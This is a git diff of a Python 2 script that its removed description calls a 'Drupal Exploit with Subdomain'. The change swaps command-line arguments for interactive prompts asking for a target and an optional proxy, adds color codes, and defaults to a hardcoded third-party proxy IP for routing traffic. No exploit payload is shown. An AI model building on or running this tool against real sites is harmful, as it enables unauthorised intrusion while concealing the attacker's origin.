@@ -2,22 +2,28 @@
 
 import sys,argparse,os
 import requests
+from random import randint
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
 
+target = raw_input(bcolors.OKGREEN + "Target :" + bcolors.ENDC)
+yn = raw_input(bcolors.WARNING + "Do you want use proxy ?"+ bcolors.BOLD +"[Y/N] :" + bcolors.ENDC)
+if yn == "Y":
+	p_ip = raw_input(bcolors.OKGREEN + "IP :" + bcolors.ENDC)
+	p_port = raw_input(bcolors.OKGREEN + "PORT :" + bcolors.ENDC)
+	p_full = p_ip + ":" + p_port
+else:
+	p_full = "138.201.223.250:31288"
 
-def main(argv):
+http_proxy = p_full
 
-    global target
-    parser = argparse.ArgumentParser(
-        description='Drupal Exploit with Subdomain ')
-    parser.add_argument('-t', '--target', help='target url', required=True)
-    args = parser.parse_args()
-
-    target = args.target
-
-if __name__ == "__main__":
-    main(sys.argv[1:])
-
-http_proxy = "138.201.223.250:31288"
 
 proxyDict = {"http":http_proxy}
 
